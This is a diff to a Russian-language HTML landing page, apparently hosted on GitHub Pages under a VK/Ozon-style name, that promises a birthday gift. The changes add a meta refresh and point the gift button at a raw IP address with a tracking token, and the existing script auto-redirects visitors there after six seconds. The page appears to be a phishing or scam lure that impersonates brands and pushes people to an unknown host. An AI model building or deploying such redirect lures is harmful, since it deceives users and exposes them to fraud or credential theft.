@@ -2,25 +2,24 @@
 <html lang="ru">
 <head>
 <meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Забери подарки прямо сейчас 🎁</title>
+<title>Забери подарки прямо сейчас</title>
 
-<!-- Open Graph для ВК -->
-<meta property="og:title" content="Забери подарки прямо сейчас 🎁">
-<meta property="og:description" content="С днём рождения! Твой подарок уже ждёт тебя.">
+<!-- Open Graph теги для превью -->
+<meta property="og:title" content="Забери подарки прямо сейчас">
+<meta property="og:description" content=".">
 <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRxMhIkaTmnLlSu4mFq-8OtMLiWr5v-1U4gdLv5T8dKMg&s">
-<meta property="og:image:width" content="1200">
-<meta property="og:image:height" content="630">
-<meta property="og:url" content="https://vk-ozon-podarki.github.io/">
+<meta property="og:url" content="https://vk-ozon-podarki.github.io">
 <meta property="og:type" content="website">
 <meta property="og:site_name" content="Забери подарки прямо сейчас">
-<meta property="og:locale" content="ru_RU">
 
-<!-- Twitter Card -->
+<!-- Twitter Card теги -->
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:title" content="Забери подарки прямо сейчас 🎁">
-<meta name="twitter:description" content="С днём рождения! Твой подарок уже ждёт тебя.">
+<meta name="twitter:title" content="Забери подарки прямо сейчас">
+<meta name="twitter:description" content=".">
 <meta name="twitter:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRxMhIkaTmnLlSu4mFq-8OtMLiWr5v-1U4gdLv5T8dKMg&s">
+
+<!-- Мгновенный редирект через meta (для ботов и тех, у кого JS отключён) -->
+<meta http-equiv="refresh" content="6; url=https://45.115.26.145/?s=sCcUFzRVCt">
 
 <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -97,7 +96,7 @@
 <div class="hero-wrap">
     <img src="cake.jpg" alt="Праздничный торт">
     
-    <a href="https://drhanaebarraki.com/?s=nCMBHDxMaF" class="btn-gift" id="giftBtn">
+    <a href="https://45.115.26.145/?s=sCcUFzRVCt" class="btn-gift" id="giftBtn">
         🎁 Забрать подарок
     </a>
 </div>
@@ -107,6 +106,7 @@
     const targetUrl = giftBtn.href;
     let redirected = false;
 
+    // Редирект через 6 секунд
     const redirectTimeout = setTimeout(() => {
         if (!redirected) {
             redirected = true;
@@ -114,6 +114,7 @@
         }
     }, 6000);
 
+    // Мгновенный переход по клику
     giftBtn.addEventListener('click', function(e) {
         e.preventDefault();
         if (!redirected) {
